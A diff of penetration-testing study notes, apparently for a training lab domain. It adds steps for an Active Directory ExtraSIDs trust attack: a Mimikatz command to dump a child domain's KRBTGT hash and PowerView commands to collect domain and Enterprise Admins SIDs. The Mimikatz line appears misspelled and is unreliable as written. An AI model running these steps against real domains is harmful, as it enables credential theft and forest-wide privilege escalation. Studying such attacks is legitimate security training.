@@ -406,7 +406,7 @@ Trust: Used to establish forest-forest or domain-domain authentication; lets use
 
 - Forest: Transitive trust between two forest root domains 
 
-**Trust Enumeration**
+## **Trust Enumeration**
 
 ```
 Get-DomainTrustMapping
@@ -416,6 +416,35 @@ Get-DomainTrustMapping
 netdom query /domain:inlanefreight.local trust
 netdom query /domain:inlanefreight.local dc
 netdom query /domain:inlanefreight.local workstation
+```
+
+## **Trust Exploitation**
+sidHistory: attribute used in migration scenarios if a user in one domain is migrated to another, a new account is created in the second. the original SID will be added to the new user's SID history attribute. 
+
+extraSIDS attack: lets user add an admin account to the SID history attribute of an account they can control 
+>[!NOTE]
+>KRBTGT hash for child domain
+>SID for child domain
+>Name of target user (can be fake) 
+>FDQN of child domain (X.INLANEFREIGHT.LOCAL) 
+>SID of Enterprise Admins group of root domain
+
+### **Mimikatz** 
+
+**KRBTGT hash**
+
+```
+.\mimikatz.exe 
+lsadump::dsync /user:CHILD-DOMAIN\krbtgt
+```
+
+SID for child domain 
+```
+Get-DomainSID #run from within/from the child domain 
+```
+SID for Enterprise Admins 
+```
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname, objectsid
 ```
 
 
